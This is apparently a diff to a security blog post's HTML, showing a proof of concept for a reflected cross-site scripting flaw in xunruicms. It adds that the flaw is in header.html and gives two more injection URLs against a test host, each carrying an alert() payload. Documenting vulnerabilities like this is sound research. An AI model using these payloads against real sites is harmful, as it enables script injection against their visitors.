@@ -138,6 +138,9 @@
 <h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>Here , The parsing order is same as the example.</p>
 <p>url : <code>index.php?m=s404&amp;uri=llfam%27)%3balert(1)%3balert(%272</code></p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/xunruicms_xss/04.png" alt="04"></p>
+<p>Vuln is in header.html , so …</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://cms.test/index.php?c=category&amp;id=llfam&amp;dir=llfam%27)%3balert(1)%3balert(%272</span><br><span class="line">http://cms.test/index.php?c=show&amp;a=llfam%27)%3balert(1)%3balert(%272</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
 <p>But , it is hard to exploit。</p>
 
       </div>
